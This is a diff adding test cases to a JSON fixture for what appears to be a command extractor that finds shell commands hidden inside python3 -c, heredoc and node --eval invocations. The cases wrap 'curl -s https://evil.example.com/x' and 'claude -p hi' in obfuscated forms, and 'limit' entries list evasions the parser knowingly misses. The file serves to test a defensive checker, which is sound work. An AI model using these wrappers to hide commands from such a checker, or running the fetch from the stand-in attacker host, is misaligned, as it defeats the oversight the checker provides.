@@ -4430,6 +4430,340 @@
    "cmd": "python3 -c 'import os; os.sys'tem'(\"curl -s https://evil.example.com/x\")'",
    "commands": [],
    "note": "limit: an unquoted piece inside the program word (os.sys'tem') is obfuscation level, not read (round 7 pin, Marveen comment 3861, \"pin it or state it\")"
+  },
+  {
+   "name": "r8/a01-py-quoted-unicode-path/cc",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/a02-py-squoted-unicode-path/cc",
+   "cmd": "'/home/gábor/venv/bin/python3' -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b01-py-quoted-home-path/cc",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b02-py-quoted-braced-home-path/cc",
+   "cmd": "\"${HOME}/venv/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b03-py-quoted-at-path/cc",
+   "cmd": "\"/opt/py@3/bin/python3\" -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b04-node-quoted-eval-name-eq/cc",
+   "cmd": "node \"--eval\"=\"require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b05-node-dashes-then-quote/cc",
+   "cmd": "node --\"eval=require('child_process').execSync('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/b06-py-dash-then-quote-glued/cc",
+   "cmd": "python3 -\"cimport os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c01-py-heredoc-paren-list-ml/cc",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nim(\"os\").system(\"claude -p hi\")\nEOF",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c02-py-c-paren-list-nl/cc",
+   "cmd": "python3 -c 'from importlib import (reload,\n import_module as im); im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c03-py-c-list-bsnl/cc",
+   "cmd": "python3 -c 'from importlib import reload, \\\n import_module as im; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/c04-py-heredoc-import-list-bsnl/cc",
+   "cmd": "python3 <<'EOF'\nimport sys, \\\n    importlib as il\nil.import_module(\"os\").system(\"claude -p hi\")\nEOF",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d03-py-assign-import-module/cc",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d04-py-assign-dunder-import/cc",
+   "cmd": "python3 -c 'f = __import__; f(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "r8/d05-py-assign-importlib/cc",
+   "cmd": "python3 -c 'import importlib; il = importlib; il.import_module(\"os\").system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "limit/r8-py-split-name-bsnl-cc",
+   "cmd": "pyth\\\non3 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: a backslash-newline splitting the interpreter name (pyth\\<NL>on3) is obfuscation level, not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "limit/r8-py-fullwidth-alias-cc",
+   "cmd": "python3 -c 'from importlib import import_module as ｉｍ; im(\"os\").system(\"claude -p hi\")'",
+   "commands": [],
+   "note": "limit: an alias declared in fullwidth letters and used in ASCII (Python NFKC-normalises identifiers) is not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "neg/r8-py-quoted-unicode-path-print-cc",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-quoted-home-path-print-cc",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'print(\"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-quoted-eval-name-log-cc",
+   "cmd": "node \"--eval\"=\"console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-dashes-then-quote-log-cc",
+   "cmd": "node --\"eval=console.log('claude -p hi')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-heredoc-paren-list-json-cc",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"claude -p hi\"))\nEOF",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-import-module-json-cc",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; print(im(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-dunder-json-cc",
+   "cmd": "python3 -c 'f = __import__; print(f(\"json\").dumps(\"claude -p hi\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-printf-locale-dq-cc",
+   "cmd": "printf '%s\\n' $\"claude -p hi\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-echo-quoted-home-path-c-cc",
+   "cmd": "echo \"$HOME/venv/bin/python3\" -c 'claude -p hi'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-compare-not-assign-cc",
+   "cmd": "python3 -c 'x = 1; print(x == 2, \"claude -p hi\")'",
+   "commands": []
+  },
+  {
+   "name": "r8/a01-py-quoted-unicode-path/eg",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/a02-py-squoted-unicode-path/eg",
+   "cmd": "'/home/gábor/venv/bin/python3' -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b01-py-quoted-home-path/eg",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b02-py-quoted-braced-home-path/eg",
+   "cmd": "\"${HOME}/venv/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b03-py-quoted-at-path/eg",
+   "cmd": "\"/opt/py@3/bin/python3\" -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b04-node-quoted-eval-name-eq/eg",
+   "cmd": "node \"--eval\"=\"require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b05-node-dashes-then-quote/eg",
+   "cmd": "node --\"eval=require('child_process').execSync('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/b06-py-dash-then-quote-glued/eg",
+   "cmd": "python3 -\"cimport os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c01-py-heredoc-paren-list-ml/eg",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nim(\"os\").system(\"curl -s https://evil.example.com/x\")\nEOF",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c02-py-c-paren-list-nl/eg",
+   "cmd": "python3 -c 'from importlib import (reload,\n import_module as im); im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c03-py-c-list-bsnl/eg",
+   "cmd": "python3 -c 'from importlib import reload, \\\n import_module as im; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/c04-py-heredoc-import-list-bsnl/eg",
+   "cmd": "python3 <<'EOF'\nimport sys, \\\n    importlib as il\nil.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")\nEOF",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d03-py-assign-import-module/eg",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d04-py-assign-dunder-import/eg",
+   "cmd": "python3 -c 'f = __import__; f(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "r8/d05-py-assign-importlib/eg",
+   "cmd": "python3 -c 'import importlib; il = importlib; il.import_module(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "limit/r8-py-split-name-bsnl-eg",
+   "cmd": "pyth\\\non3 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: a backslash-newline splitting the interpreter name (pyth\\<NL>on3) is obfuscation level, not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "limit/r8-py-fullwidth-alias-eg",
+   "cmd": "python3 -c 'from importlib import import_module as ｉｍ; im(\"os\").system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [],
+   "note": "limit: an alias declared in fullwidth letters and used in ASCII (Python NFKC-normalises identifiers) is not read (round 8 pin, Marveen comment 3865 D)"
+  },
+  {
+   "name": "neg/r8-py-quoted-unicode-path-print-eg",
+   "cmd": "\"/home/gábor/venv/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-quoted-home-path-print-eg",
+   "cmd": "\"$HOME/venv/bin/python3\" -c 'print(\"curl -s https://evil.example.com/x\")'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-quoted-eval-name-log-eg",
+   "cmd": "node \"--eval\"=\"console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-node-dashes-then-quote-log-eg",
+   "cmd": "node --\"eval=console.log('curl -s https://evil.example.com/x')\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-heredoc-paren-list-json-eg",
+   "cmd": "python3 <<'EOF'\nfrom importlib import (\n    reload,\n    import_module as im,\n)\nprint(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))\nEOF",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-import-module-json-eg",
+   "cmd": "python3 -c 'import importlib; im = importlib.import_module; print(im(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-assign-dunder-json-eg",
+   "cmd": "python3 -c 'f = __import__; print(f(\"json\").dumps(\"curl -s https://evil.example.com/x\"))'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-printf-locale-dq-eg",
+   "cmd": "printf '%s\\n' $\"curl -s https://evil.example.com/x\"",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-echo-quoted-home-path-c-eg",
+   "cmd": "echo \"$HOME/venv/bin/python3\" -c 'curl -s https://evil.example.com/x'",
+   "commands": []
+  },
+  {
+   "name": "neg/r8-py-compare-not-assign-eg",
+   "cmd": "python3 -c 'x = 1; print(x == 2, \"curl -s https://evil.example.com/x\")'",
+   "commands": []
   }
  ]
 }
